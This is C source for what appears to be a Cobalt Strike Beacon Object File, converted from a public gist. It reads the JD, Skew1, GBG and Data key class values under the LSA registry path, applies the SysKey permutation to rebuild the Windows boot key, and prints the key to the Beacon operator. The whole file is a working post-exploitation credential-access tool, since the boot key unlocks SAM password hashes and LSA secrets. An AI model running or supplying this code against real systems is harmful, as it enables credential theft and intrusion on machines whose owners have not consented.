#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT WINBASEAPI LONG WINAPI ADVAPI32$RegOpenKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
DECLSPEC_IMPORT WINBASEAPI LONG WINAPI ADVAPI32$RegQueryInfoKeyA(HKEY hKey, LPSTR lpClass, LPDWORD lpcchClass, LPDWORD lpReserved, LPDWORD lpcSubKeys, LPDWORD lpcbMaxSubKeyLen, LPDWORD lpcbMaxClassLen, LPDWORD lpcValues, LPDWORD lpcbMaxValueNameLen, LPDWORD lpcbMaxValueLen, LPDWORD lpcbSecurityDescriptor, PFILETIME lpftLastWriteTime);
DECLSPEC_IMPORT WINBASEAPI LONG WINAPI ADVAPI32$RegCloseKey(HKEY hKey);

DECLSPEC_IMPORT WINBASEAPI size_t __cdecl MSVCRT$strlen(const char *str);
DECLSPEC_IMPORT int MSVCRT$strcmp(const char *str1, const char *str2);
DECLSPEC_IMPORT WINBASEAPI void* __cdecl MSVCRT$memcpy(void *dest, const void *src, size_t count);
DECLSPEC_IMPORT WINBASEAPI int __cdecl MSVCRT$sprintf(char *str, const char *format, ...);
DECLSPEC_IMPORT WINBASEAPI int __cdecl MSVCRT$sscanf(const char *str, const char *format, ...);

#define BOOT_KEY_SIZE 16

// converted from: https://gist.github.com/Dfte/3462d0a08af57392e1629b8c83021155

void HexStrToByteArray(const char *hexString, BYTE *byteArray, int *bytesRead) {
    size_t len = MSVCRT$strlen(hexString);
    *bytesRead = 0;
    
    for (size_t i = 0; i < len; i += 2) {
        if (i + 1 < len) {
            unsigned int byte = 0;
            MSVCRT$sscanf(hexString + i, "%2x", &byte);
            byteArray[*bytesRead] = (BYTE)byte;
            (*bytesRead)++;
        }
    }
}

BOOL GetRegistryClassValue(HKEY rootKey, const char* subKey, char* classValue, DWORD classValueSize) {
    HKEY hKey = NULL;
    LONG result = ADVAPI32$RegOpenKeyExA(rootKey, subKey, 0, KEY_READ, &hKey);
    
    if (result != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[X] Error opening registry key %s: %ld\n", subKey, result);
        return FALSE;
    }

    result = ADVAPI32$RegQueryInfoKeyA(hKey, classValue, &classValueSize, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    if (result != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[X] Error querying registry key class %s: %ld\n", subKey, result);
        ADVAPI32$RegCloseKey(hKey);
        return FALSE;
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[+] %s: %s\n", subKey, classValue);
    ADVAPI32$RegCloseKey(hKey);
    return TRUE;
}

// permute the boot key (Syskey transformation)
void PermuteBootKey(BYTE *bootKey) {
    BYTE temp[BOOT_KEY_SIZE];
    MSVCRT$memcpy(temp, bootKey, BOOT_KEY_SIZE);

    int transforms[] = { 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 };
    
    for (int i = 0; i < BOOT_KEY_SIZE; ++i) {
        bootKey[i] = temp[transforms[i]];
    }
}

void GetBootKey() {
    const char* keys[] = { "JD", "Skew1", "GBG", "Data" };
    const char* basePath = "SYSTEM\\CurrentControlSet\\Control\\Lsa\\";
    char fullPath[256];
    char classValue[256];
    BYTE bootKey[BOOT_KEY_SIZE];
    BYTE assembledKey[BOOT_KEY_SIZE * 2]; // temp storage for assembling
    int totalBytes = 0;
    
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Reading from: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\n\n");
    
    for (int i = 0; i < 4; ++i) {
        MSVCRT$sprintf(fullPath, "%s%s", basePath, keys[i]);
        
        DWORD classValueSize = sizeof(classValue);
        if (GetRegistryClassValue(HKEY_LOCAL_MACHINE, fullPath, classValue, classValueSize)) {
            int bytesRead = 0;
            HexStrToByteArray(classValue, assembledKey + totalBytes, &bytesRead);
            totalBytes += bytesRead;
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[X] Failed to extract component from %s\n", keys[i]);
            return;
        }
    }
    
    if (totalBytes != BOOT_KEY_SIZE) {
        BeaconPrintf(CALLBACK_ERROR, "[X] Invalid bootkey size: %d bytes (expected 16)\n", totalBytes);
        return;
    }
    
    MSVCRT$memcpy(bootKey, assembledKey, BOOT_KEY_SIZE);
    PermuteBootKey(bootKey);
    
    BeaconPrintf(CALLBACK_OUTPUT, "\n[+] bootkey: ");
    for (int i = 0; i < BOOT_KEY_SIZE; ++i) {
        BeaconPrintf(CALLBACK_OUTPUT, "%02x", bootKey[i]);
    }
    BeaconPrintf(CALLBACK_OUTPUT, "\n");
    
    BeaconPrintf(CALLBACK_OUTPUT, "[+] bootkey bytes: ");
    for (int i = 0; i < BOOT_KEY_SIZE; ++i) {
        BeaconPrintf(CALLBACK_OUTPUT, "0x%02x ", bootKey[i]);
    }
    BeaconPrintf(CALLBACK_OUTPUT, "\n");
}

VOID go (IN PCHAR Buffer, IN ULONG Length) {
    GetBootKey();
}